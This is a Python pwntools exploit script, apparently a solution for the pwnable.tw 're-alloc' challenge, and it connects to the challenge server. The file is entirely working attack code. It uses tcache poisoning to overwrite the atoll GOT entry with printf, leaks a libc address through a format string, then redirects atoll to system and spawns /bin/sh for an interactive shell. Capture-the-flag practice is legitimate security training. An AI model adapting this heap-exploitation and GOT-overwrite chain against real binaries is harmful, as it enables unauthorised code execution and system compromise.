import pwn

elf = pwn.ELF("./re-alloc_patched")
libc = pwn.ELF("./libc.so.6")
ATOLL_GOT = elf.got['atoll']
PRINTF_PLT = 0x401070
is_local = False
if is_local:
    pwn.context.update(os='linux')
    p = pwn.process("./re-alloc_patched")
else:
    p = pwn.remote('chall.pwnable.tw', 10106)

def create_chunk(index, size=b'0', data=b''):
    global p
    p.sendlineafter(b"Your choice:", b"1")
    p.sendlineafter(b"Index:", index)
    p.sendlineafter(b"Size:", size)
    p.sendlineafter(b"Data:", data)

def realloc_chunk(index, size=b'0', data=b''):
    global p
    p.sendlineafter(b"Your choice:", b"2")
    p.sendlineafter(b"Index:", index)
    p.sendlineafter(b"Size:", size)
    if size == b'0':
        return
    p.sendlineafter(b"Data:", data)

def free_chunk(index):
    global b
    p.sendlineafter(b"Your choice:", b"3")
    p.sendlineafter(b"Index:", index)

# tcache poisoning
create_chunk(b'0', b'16', b'AAA') 
realloc_chunk(b'0')
realloc_chunk(b'0', b'16', pwn.p32(ATOLL_GOT))
create_chunk(b'1', b'16', b'AAA')

# null out
realloc_chunk(b'0', b'100', b'BBB')
free_chunk(b'0')
realloc_chunk(b'1', b'120', b'BBB')
free_chunk(b'1')

create_chunk(b'0', b'30', b'AAA')
realloc_chunk(b'0')
realloc_chunk(b'0', b'30', pwn.p64(ATOLL_GOT))
create_chunk(b'1', b'30', b'AAA')

# null out
realloc_chunk(b'0', b'100', b'BBB')
free_chunk(b'0')
realloc_chunk(b'1', b'120', b'BBB')
free_chunk(b'1')


# write to got->atoll
create_chunk(b'0', b'30', pwn.p32(PRINTF_PLT))

#leak address in libc
p.sendlineafter(b"Your choice:", b"3")
p.sendlineafter(b"Index:", "%21$p")
leaked_address = p.recvline()
leaked_address = int(leaked_address[:-1].decode('utf-8'), 16)
libc.address = leaked_address - 0x26b6b 
print("[+] Libc base: ", hex(libc.address))
print("[+] System address: ", hex(libc.symbols['system']))

create_chunk(b'', b'A'*15, pwn.p64(libc.symbols['system']))
p.sendlineafter(b"Your choice:", b"3")
p.sendlineafter(b"Index:", b"/bin/sh")
p.interactive()
